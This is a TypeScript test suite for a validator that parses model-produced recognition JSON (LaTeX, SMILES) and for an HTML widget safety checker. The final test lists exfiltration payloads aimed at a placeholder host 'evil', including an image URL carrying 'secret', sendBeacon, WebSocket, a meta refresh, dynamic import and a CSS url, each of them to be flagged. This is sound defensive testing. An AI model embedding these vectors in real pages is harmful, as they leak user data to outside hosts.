import { test } from 'node:test'
import assert from 'node:assert/strict'
import { validateRecognition, validateWidgetHtml, extractJson } from '../src/validate.ts'

test('valid recognition JSON parses', () => {
  const r = validateRecognition('{"formal":{"kind":"latex","value":"x^2+1"},"confidence":0.9,"readAs":"x²+1"}')
  assert.equal(r.formal.kind, 'latex')
  assert.equal(r.formal.value, 'x^2+1')
  assert.equal(r.readAs, 'x²+1')
  assert.equal(r.confidence, 0.9)
})

test('JSON wrapped in prose / fences is extracted', () => {
  const raw = 'Sure! ```json\n{"formal":{"kind":"smiles","value":"CCO"},"confidence":0.8,"readAs":"ethanol"}\n``` done'
  const r = validateRecognition(raw)
  assert.equal(r.formal.kind, 'smiles')
  assert.equal(r.formal.value, 'CCO')
})

test('correct-or-silent: garbage → unrecognized', () => {
  assert.equal(validateRecognition('I think it says x squared plus one').formal.kind, 'unrecognized')
})

test('correct-or-silent: empty value → unrecognized', () => {
  assert.equal(validateRecognition('{"formal":{"kind":"latex","value":"  "},"confidence":0.9,"readAs":"x"}').formal.kind, 'unrecognized')
})

test('confidence is clamped to [0,1]', () => {
  const r = validateRecognition('{"formal":{"kind":"latex","value":"x"},"confidence":1.7,"readAs":"x"}')
  assert.equal(r.confidence, 1)
})

test('extractJson returns null when there is no object', () => {
  assert.equal(extractJson('no json here'), null)
})

test('widget safety: external loads are rejected, self-contained is safe', () => {
  assert.equal(validateWidgetHtml('<script src="https://cdn.example/x.js"></script>').safe, false)
  assert.equal(validateWidgetHtml('<div>2+2</div><script>document.title="ok"</script>').safe, true)
  assert.deepEqual(validateWidgetHtml('<iframe src="x"></iframe>').violations.includes('iframe'), true)
})

test('widget safety: broadened exfiltration/navigation vectors are caught', () => {
  // Each of these previously PASSED the four-regex check. The WKWebView CSP is still the real boundary,
  // but the server tripwire should now flag them too (defense-in-depth).
  assert.equal(validateWidgetHtml('<img src="http://evil/p?d=secret">').safe, false)
  assert.equal(validateWidgetHtml('<img src="//evil/p">').safe, false)            // protocol-relative
  assert.equal(validateWidgetHtml('<meta http-equiv="refresh" content="0;url=http://evil">').safe, false)
  assert.equal(validateWidgetHtml('<base href="http://evil/">').safe, false)
  assert.equal(validateWidgetHtml('<script>navigator.sendBeacon("http://evil", d)</script>').safe, false)
  assert.equal(validateWidgetHtml('<script>new WebSocket("ws://evil")</script>').safe, false)
  assert.equal(validateWidgetHtml('<script>new EventSource("/x")</script>').safe, false)
  assert.equal(validateWidgetHtml('<script>import("http://evil/m.js")</script>').safe, false)
  assert.equal(validateWidgetHtml('<script>fetch("/x")</script>').safe, false)
  assert.equal(validateWidgetHtml('<style>body{background:url(https://evil/i.png)}</style>').safe, false)
})
